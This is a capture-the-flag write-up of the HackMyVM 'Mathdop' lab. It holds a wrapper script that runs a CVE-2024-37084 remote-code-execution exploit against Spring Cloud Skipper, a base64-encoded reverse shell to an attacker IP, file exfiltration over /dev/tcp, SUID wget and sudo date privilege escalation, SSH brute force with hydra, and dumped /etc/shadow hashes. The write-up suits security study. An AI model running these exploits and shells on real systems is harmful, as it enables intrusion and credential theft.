# Mathdop

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.53:22
Open 10.0.2.53:7577
Open 10.0.2.53:9393
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.53

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:78:16:74:49:a1:68:9d:54:84:8a:59:e9:38:10:bc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdPJ1Z9gllAfniDW7yZCKqj6TVknlpeqZbtMKgX0aK9G2lozR2guobYrIE8Hd9U29C18KKP7Oj58q3OkjXZ+0/mRPlpr4vAIzZ2ACd7AHR/X85jUKvyqzEap0GMru/ZTuDGXwRuZ1pA8juBvJdksuJUJYgW7a1SKvFEcbqw3rbQR8V2DFzfjmMYUz3E6T5j3tJuphgOLpCdnPfA9j8Gjm+nV+1S0p+a7dKRvkBTYRMFxC4kwCP95HGAHHpRFEgh6qTdlcQG8OWmnIAlmcz0F7gwoFeBGjwwzNH0pXwaZnmzcCDuPoXkQf10f0BsvziIY860KeY5D17P8Zdk6RTRJ53
|   256 06:0c:4d:9d:2c:32:43:d2:3d:f7:4f:82:c8:15:85:60 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHGheDBa6Ti1SDe5X0lSeN45hY6xaWScDwQgrTow+4WPOT2KVqFC30ctL+Cki2kQgQfkSzmCh4NyArtoVCVfmgM=
|   256 3b:cd:fc:1f:dd:48:0f:ee:17:78:9a:f1:09:cb:8c:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM2euDjTHPuzUfJ7w80zGZ3/94Jd9gkBrQuNoq3fapoh
7577/tcp open  http    syn-ack Apache Tomcat (language: en)
| http-methods: 
|   Supported Methods: GET HEAD POST PUT PATCH DELETE OPTIONS
|_  Potentially risky methods: PUT PATCH DELETE
| http-title: Site doesn't have a title (application/hal+json).
|_Requested resource was http://10.0.2.53:7577/api
9393/tcp open  http    syn-ack Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (application/hal+json).
|_http-favicon: Unknown favicon MD5: 1C3BE2126227EF0C2E74A2427D7296AF
| http-methods: 
|   Supported Methods: GET HEAD POST PUT PATCH DELETE OPTIONS
|_  Potentially risky methods: PUT PATCH DELETE
```
:::

## HTTP (7577)

```bash
â””â”€$ curl http://mathdop.hmv:7577 -Li
HTTP/1.1 302
Location: http://mathdop.hmv:7577/api
Content-Language: en-US
Content-Length: 0
Date: Wed, 10 Sep 2025 17:40:19 GMT

HTTP/1.1 200
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Type: application/hal+json
Transfer-Encoding: chunked
Date: Wed, 10 Sep 2025 17:40:19 GMT

{
  "_links" : {
    "packageMetadata" : {
      "href" : "http://mathdop.hmv:7577/api/packageMetadata{?page,size,sort,projection}",
      "templated" : true
    },
    "releases" : {
      "href" : "http://mathdop.hmv:7577/api/releases{?page,size,sort}",
      "templated" : true
    },
    "repositories" : {
      "href" : "http://mathdop.hmv:7577/api/repositories{?page,size,sort}",
      "templated" : true
    },
    "deployers" : {
      "href" : "http://mathdop.hmv:7577/api/deployers{?page,size,sort}",
      "templated" : true
    },
    "about" : {
      "href" : "http://mathdop.hmv:7577/api/about"
    },
    "release" : {
      "href" : "http://mathdop.hmv:7577/api/release"
    },
    "package" : {
      "href" : "http://mathdop.hmv:7577/api/package"
    },
    "profile" : {
      "href" : "http://mathdop.hmv:7577/api/profile"
    }
  }
}
```

```bash
â””â”€$ curl -s http://mathdop.hmv:7577/api/about
{
  "versionInfo" : {
    "server" : {
      "name" : "Spring Cloud Skipper Server",
      "version" : "2.11.3-SNAPSHOT"
    },
    "shell" : {
      "name" : "Spring Cloud Skipper Shell",
      "version" : "2.11.3-SNAPSHOT",
      "url" : "https://repo.maven.apache.org/maven2/org/springframework/cloud/spring-cloud-skipper-shell/2.11.3-SNAPSHOT/spring-cloud-skipper-shell-2.11.3-SNAPSHOT.jar"
    }
  }
}
```

We may come back to this, nothing lot from endpoints enumeration 

## HTTP (9393)

```bash
â””â”€$ curl -s http://mathdop.hmv:9393/ | jq | grep -oP '\Khttp[^"]+' | sort | uniq
http://mathdop.hmv:9393/about
http://mathdop.hmv:9393/apps
http://mathdop.hmv:9393/audit-records
http://mathdop.hmv:9393/completions/stream{?start,detailLevel}
http://mathdop.hmv:9393/completions/task{?start,detailLevel}
http://mathdop.hmv:9393/dashboard
http://mathdop.hmv:9393/jobs/executions
http://mathdop.hmv:9393/jobs/executions/{id}
http://mathdop.hmv:9393/jobs/executions/{jobExecutionId}/steps
http://mathdop.hmv:9393/jobs/executions/{jobExecutionId}/steps/{stepId}
http://mathdop.hmv:9393/jobs/executions/{jobExecutionId}/steps/{stepId}/progress
http://mathdop.hmv:9393/jobs/executions{?name}
http://mathdop.hmv:9393/jobs/executions{?status}
http://mathdop.hmv:9393/jobs/instances/{id}
http://mathdop.hmv:9393/jobs/instances{?name}
http://mathdop.hmv:9393/jobs/thinexecutions
http://mathdop.hmv:9393/jobs/thinexecutions{?jobInstanceId}
http://mathdop.hmv:9393/jobs/thinexecutions{?name}
http://mathdop.hmv:9393/jobs/thinexecutions{?taskExecutionId}
http://mathdop.hmv:9393/runtime/apps
http://mathdop.hmv:9393/runtime/apps/{appId}
http://mathdop.hmv:9393/runtime/apps/{appId}/instances
http://mathdop.hmv:9393/runtime/apps/{appId}/instances/{instanceId}
http://mathdop.hmv:9393/runtime/apps/{appId}/instances/{instanceId}/actuator
http://mathdop.hmv:9393/runtime/apps/{appId}/instances/{instanceId}/actuator?endpoint={endpoint}
http://mathdop.hmv:9393/runtime/apps/{appId}/instances/{instanceId}/post
http://mathdop.hmv:9393/runtime/streams{?names}
http://mathdop.hmv:9393/runtime/streams/{streamNames}
http://mathdop.hmv:9393/schema/targets
http://mathdop.hmv:9393/schema/versions
http://mathdop.hmv:9393/streams/definitions
http://mathdop.hmv:9393/streams/definitions/{name}
http://mathdop.hmv:9393/streams/deployments
http://mathdop.hmv:9393/streams/deployments/history/{name}
http://mathdop.hmv:9393/streams/deployments/manifest/{name}/{version}
http://mathdop.hmv:9393/streams/deployments/{name}
http://mathdop.hmv:9393/streams/deployments/{name}?reuse-deployment-properties=false
http://mathdop.hmv:9393/streams/deployments/platform/list
http://mathdop.hmv:9393/streams/deployments/rollback/{name}/{version}
http://mathdop.hmv:9393/streams/deployments/scale/{streamName}/{appName}/instances/{count}
http://mathdop.hmv:9393/streams/deployments/update/{name}
http://mathdop.hmv:9393/streams/logs
http://mathdop.hmv:9393/streams/logs/{streamName}
http://mathdop.hmv:9393/streams/logs/{streamName}/{appName}
http://mathdop.hmv:9393/streams/validation/{name}
http://mathdop.hmv:9393/tasks/definitions
http://mathdop.hmv:9393/tasks/definitions/{name}
http://mathdop.hmv:9393/tasks/executions
http://mathdop.hmv:9393/tasks/executions/current
http://mathdop.hmv:9393/tasks/executions/external/{externalExecutionId}{?platform}
http://mathdop.hmv:9393/tasks/executions/{id}{?schemaTarget}
http://mathdop.hmv:9393/tasks/executions/launch?name={name}{&properties,arguments}
http://mathdop.hmv:9393/tasks/executions{?name}
http://mathdop.hmv:9393/tasks/info/executions{?completed,name,days}
http://mathdop.hmv:9393/tasks/logs/{taskExternalExecutionId}{?platformName,schemaTarget}
http://mathdop.hmv:9393/tasks/platforms
http://mathdop.hmv:9393/tasks/thinexecutions
http://mathdop.hmv:9393/tasks/validation/{name}
http://mathdop.hmv:9393/tools
```

```bash
â””â”€$ curl -s http://mathdop.hmv:9393/about | jq .versionInfo
{
  "implementation": {
    "name": "spring-cloud-dataflow-server",
    "version": "2.11.3-SNAPSHOT"
  },
  "core": {
    "name": "Spring Cloud Data Flow Core",
    "version": "2.11.3-SNAPSHOT"
  },
  "dashboard": {
    "name": "Spring Cloud Dataflow UI",
    "version": "3.4.3-SNAPSHOT"
  },
  "shell": {
    "name": "Spring Cloud Data Flow Shell",
    "version": "2.11.3-SNAPSHOT",
    "url": "https://repo.spring.io/snapshot/org/springframework/cloud/spring-cloud-dataflow-shell/2.11.3-SNAPSHOT/spring-cloud-dataflow-shell-2.11.3-SNAPSHOT.jar"
  }
}
```

## CVE-2024-37084

- Spring.io: [CVE-2024-37084: Remote code execution in Spring Cloud Data Flow](https://spring.io/security/cve-2024-37084)
- Cvefeed.io: [CVE-2024-37084: Remote code execution in Spring Cloud Data Flow](https://cvefeed.io/vuln/detail/CVE-2024-37084)
- [CVE-2024-37084-Exp](https://github.com/Ly4j/CVE-2024-37084-Exp) (Used in writeup)
- [CVE-2024-37084-Poc](https://github.com/Kayiyan/CVE-2024-37084-Poc)
	- [Analysis and demo](https://kayiyan.gitbook.io/research/cve/cve-2024-37084-spring-cloud-remote-code-execution) (Good read)
	- [Yaml payload](https://github.com/artsploit/yaml-payload)

```bash
#!/bin/bash

set -e

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"; }

if [ $# -lt 1 ]; then echo "Usage: $0 <replacement_command>"; exit 1; fi

REPLACEMENT="$1"

if [ ! -d "CVE-2024-37084-Exp" ]; then
    log "Cloning repository..."
    /bin/git clone https://github.com/Ly4j/CVE-2024-37084-Exp.git -q
else
    log "Repository already exists, continuing..."
fi

cd CVE-2024-37084-Exp/yaml-payload-master

log "Replacing command in AwesomeScriptEngineFactory.java with: $REPLACEMENT"
/bin/sed -i "s#Runtime\.getRuntime().exec(\".*\");#Runtime.getRuntime().exec(\"$REPLACEMENT\");#" src/artsploit/AwesomeScriptEngineFactory.java

log "Generating YAML payload..."
/bin/javac  -source 8 -target 8 src/artsploit/AwesomeScriptEngineFactory.java 1>/dev/null 2>/dev/null
/bin/jar -cvf yaml-payload.jar -C src/ . 1>/dev/null 2>/dev/null
/bin/strings src/artsploit/AwesomeScriptEngineFactory.java | grep "Runtime.getRuntime()"

cd ../

pwd
log "Starting HTTP server on port 80..."
/bin/python3 -m http.server 80 &
HTTP_PID=$!

log "Running exploit script..."
/bin/python3 cve-2024-37084-exp.py -u http://mathdop.hmv:7577 -payload http://10.0.2.15/yaml-payload-master/yaml-payload.jar

sleep 3

log "Killing HTTP server..."
kill $HTTP_PID

log "Done."

# â””â”€$ ./fuck.sh $'bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMi4xNS80NDQ1IDA+JjE=}|{base64,-d}|{bash,-i}'
```

The exploit is fucking bullshit, if you mess up your payload on first try there's no second chance, or I couldn't find any. Only way to make it work was to reinitialize the box itself...

```bash
â””â”€$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.54] 48186
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
cnb@921567b128b2:/workspace$ id
uid=1000(cnb) gid=1000(cnb) groups=1000(cnb)
```

### Container (cnb)

We are inside Docker container and might have to do breakout.
```bash
cnb@921567b128b2:~$ cd
cnb@921567b128b2:~$ ls -lAh
total 4.0K
lrwxrwxrwx. 1 root root   9 Mar 30 10:26 .bash_history -> /dev/null
-rw-r--r--. 1 root root 377 Mar 30 10:25 note
cnb@921567b128b2:~$ cat note
Hi mathlake
Long time no see, 256 is my favorite number. I know you are very interested in mathematics, but I have been struggling with a math problem recently. The method used is time series decomposition. I have sent you the data, and you can provide me with the mathematical expressions for T, S, and C (rounded to the nearest integer) corresponding to the month.
June 2025
```

```bash
cnb@921567b128b2:~$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/local/bin/wget # <-- SUID wget
```

### Privilege Escalation (root)

[https://gtfobins.github.io/gtfobins/wget/#suid](https://gtfobins.github.io/gtfobins/wget/#suid)

```bash
cnb@921567b128b2:~$ echo $'#!/bin/bash -p\n/bin/bash -p 1>&0' > /tmp/t.sh
cnb@921567b128b2:~$ chmod +x /tmp/t.sh
cnb@921567b128b2:~$ wget --use-askpass=/tmp/t.sh 0
bash-4.4# id
uid=1000(cnb) gid=1000(cnb) euid=0(root) egid=0(root) groups=0(root),1000(cnb)
```

In `/var/mail` there's data that `cnb` user talked about.
```bash
bash-4.4# pwd
/var/mail/mathlake
bash-4.4# ls -lAh
total 28K
-rw-r--r--. 1 root mail  11K Mar  7  2025 data.xlsx
-rw-r--r--. 1 root mail 3.9K Mar 11  2025 test.png
-rw-r--r--. 1 root mail 8.7K Mar 11  2025 true.png
```

Download
```bash
â””â”€$ nc -lvnp 4444 > data.xlsx
---
bash-4.4# send() { cat "$1" > /dev/tcp/10.0.2.15/4444; }
bash-4.4# send ./data.xlsx
---
â””â”€$ nc -lvnp 4444 > test.png
---
bash-4.4# send ./test.png
---
â””â”€$ nc -lvnp 4444 > true.png
---
bash-4.4# send ./true.png
---
â””â”€$ file data.xlsx *.png
data.xlsx: Microsoft Excel 2007+
test.png:  PNG image data, 353 x 128, 8-bit colormap, non-interlaced
true.png:  PNG image data, 524 x 100, 8-bit/color RGBA, non-interlaced
```

![test.png](/assets/pentest/hackmyvm/mathdop/test.png)

![true.png](/assets/pentest/hackmyvm/mathdop/true.png)

![writeup.png](/assets/pentest/hackmyvm/mathdop/writeup.png)

### Time Series Decomposition â€“ June 2025 (Sales Data)

*Dash of AI slop~*

We are analyzing quarterly sales data (2015â€“2020) using **time series decomposition**.  
The model separates observed values into **Trend (T)**, **Seasonal (S)**, and **Cyclic/Irregular (C)** components.


ðŸ“ Model

- **Multiplicative form** (as shown in the Python output):

$$Y_t \approx T_t \times S_t \times C_t$$

- Forecasted value:

$$\hat{Y}_t = T_t \cdot S_t \cdot C_t$$


ðŸ§© Components
- **T (Trend):** long-term growth/smooth change.  
- **S (Seasonal):** regular fluctuation by quarter (Q1, Q2, Q3, Q4).  
- **C (Cyclic/Irregular):** residual/random component.  

âœ… Example (from 2021 Q1)

- $$T = 45.4465$$  
- $$S = 0.7922$$  
- $$C = 1.002$$  

Forecast:

$$\hat{Y} = 45.4465 \times 0.7922 \times 1.002 \approx 36.07$$

ðŸŽ¯ Task

For **June 2025 (Q2 2025)**:
1. Extend the **trend (T)** to 2025.  
2. Take the **seasonal index (S)** for Q2.  
3. Apply the **cyclic factor (C)**.  
4. Compute and round each of **T, S, C** to the nearest integer.  

$$
\text{Final Forecast} = T_{2025,Q2} \cdot S_{Q2} \cdot C_{2025,Q2}
$$
This will give you a table like:

|Date|Year|Quarter|T|S|C|Forecast|
|---|---|---|---|---|---|---|
|2021-01-01|2021|1|45|1|1|45|
|2021-04-01|2021|2|46|1|1|46|
|â€¦|â€¦|â€¦|â€¦|â€¦|â€¦|â€¦|
|2025-04-01|2025|2|58|1|1|58|
|2025-07-01|2025|3|59|1|1|59|
This was too confusing, hint mentioned 256 is my favorite number. After some hints from discord it turned out to be smth like:
```bash
#!/bin/bash
for i in {54..56}; do
        for j in {0..6}; do
                for k in {0..1}; do
                        echo "$i*$j*$k" | sha256sum | awk '{print $1}';
                done
        done
done
```

```bash
â””â”€$ for i in {54..56}; do for j in {0..6}; do for k in {0..1}; do echo "$i*$j*$k" | sha256sum | awk '{print $1}'; done; done; done > hashes.txt
â””â”€$ hydra -l mathlake -P hashes.txt mathdop.hmv ssh
[22][ssh] host: mathdop.hmv   login: mathlake   password: 9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3
# Weird flex
```

## SSH

```bash
â””â”€$ sshpass -p '9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3' ssh -l mathlake mathdop.hmv
[mathlake@mathdop ~]$ id
uid=1000(mathlake) gid=1000(mathlake) groups=1000(mathlake) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### User.txt

```bash
[mathlake@mathdop ~]$ cat user.txt
flag{d79b3daf297f1ad136284d93900c0fe8543a52eb}
```

## Privilege Escalation (root)

```bash
[mathlake@mathdop ~]$ sudo -l
Matching Defaults entries for mathlake on mathdop:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User mathlake may run the following commands on mathdop:
    (ALL) NOPASSWD: /opt/secure_input_handler.sh
```

```bash
[mathlake@mathdop ~]$ ls -lh /opt/secure_input_handler.sh
-rwxr-xr-x. 1 root root 803 Mar 30 18:00 /opt/secure_input_handler.sh

[mathlake@mathdop ~]$ cat /opt/secure_input_handler.sh
#!/bin/bash
export PATH="/usr/bin"

read -p "Input Command: " user_input

decoded_input=$(echo -n "$user_input" | base64 -d 2>/dev/null | tr -d '\r\0\a' | col -b)
if [[ ${#user_input} -gt 128 || -z "$decoded_input" ]]; then
    echo "[!] Decoding failed or input is too long" >&2
    exit 2
fi

filtered_input=$(echo "$decoded_input" | tr -cd 'a-zA-Z0-9\-_/ :.' | sed -e 's/[[:space:]]\+/ /g' -e 's/^[ \t]*//' -e 's/[ \t]*$//')

IFS=' ' read -ra cmd_args <<< "$filtered_input"
command="${cmd_args[0]}"
command_clean=$(echo "$command" | tr -d -c 'a-zA-Z0-9')

allowed_commands=("date" "pwd" "echo")
if ! printf "%s\n" "${allowed_commands[@]}" | grep -qxF "$command_clean"; then
    echo "[!] Illegal instruction: $command_clean" >&2
    exit 3
fi

/usr/bin/timeout 2 /usr/bin/bash -c "${filtered_input}"
```

```bash
allowed_commands=("date" "pwd" "echo")
```

[https://gtfobins.github.io/gtfobins/date/#file-read](https://gtfobins.github.io/gtfobins/date/#file-read)

```bash
[mathlake@mathdop ~]$ echo 'date -f /etc/shadow' | base64 | sudo /opt/secure_input_handler.sh | grep '\$'
date: invalid date â€˜# Worth waiting forâ€™
date: invalid date â€˜# 9e9feaf74138c66fbaadba5a9da259c5â€™
date: invalid date â€˜root:$6$WUx.0Qf6$/oYqJocLrdpGZJup8oAxMoxjJnZ3huUNKno6TObA/fcbax0yhptGiAP2pNcjJfsCQ0o5H2RgpyP6R/CiZh33m.:20177:0:99999:7:::â€™
...
date: invalid date â€˜mathlake:$6$XdfsxCCu$sHnJOhJpbvkbW/aLnCE/4QyYVYW0j2DNSByRxiJ2pLuFJkXi8Yk.wD33.SEUxtTuZ3z1xYqchgilvmX2yzZsq.:20177:0:99999:7:::â€™
```

There are 2 comments in `/etc/shadow`, if we try them as password it works...
```bash
[mathlake@mathdop ~]$ su -
Password: Worth waiting for
Last login: Sun Mar 30 18:35:48 CST 2025 from 192.168.137.190 on pts/1
[root@mathdop ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### Root.txt

```bash
[root@mathdop ~]# cat /root/r00000000000000000000000000000000000000000000000000000t.txt
flag{29975f78aafc266eaa88520357552917d1164964}
```

## P.S.

The CVE made to too frustrated and I wanted to debug it, as it turned out it cached the uploaded packages however I was not able to identify them. By changing names to packages then I was able to get RCE. Also I updated how command is executed, `exec` needs array or weird string with bash expansion trick.
```bash
#!/bin/bash

set -e

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"; }

if [ $# -lt 1 ]; then echo "Usage: $0 <replacement_command>"; exit 1; fi

REPLACEMENT="$1"

if [ ! -d "CVE-2024-37084-Exp" ]; then
    log "Cloning repository..."
    /bin/git clone https://github.com/Ly4j/CVE-2024-37084-Exp.git -q
else
    log "Repository already exists, continuing..."
fi

cd CVE-2024-37084-Exp/yaml-payload-master

log "Replacing command in AwesomeScriptEngineFactory.java with: $REPLACEMENT" # Update how command is executed
/bin/sed -i "s#Runtime\.getRuntime().exec(.*);#Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"$REPLACEMENT\"});#" src/artsploit/AwesomeScriptEngineFactory.java

name=$(head -c 16 /dev/urandom | xxd -p) # Get random package name
log "Generating YAML payload $name..."
/bin/javac  -source 8 -target 8 src/artsploit/AwesomeScriptEngineFactory.java 1>/dev/null 2>/dev/null
/bin/jar -cvf "$name.jar" -C src/ . 1>/dev/null 2>/dev/null
/bin/strings src/artsploit/AwesomeScriptEngineFactory.java | grep "Runtime.getRuntime()"

cd ../

pwd
log "Starting HTTP server on port 80..."
/bin/python3 -m http.server 80 &
HTTP_PID=$!

log "Running exploit script..."
/bin/python3 cve-2024-37084-exp.py -u http://mathdop.hmv:7577 -payload "http://10.0.2.15/yaml-payload-master/$name.jar"

sleep 3

log "Killing HTTP server..."
kill $HTTP_PID

log "Done."
```

![writeup-1.png](/assets/pentest/hackmyvm/mathdop/writeup-1.png)

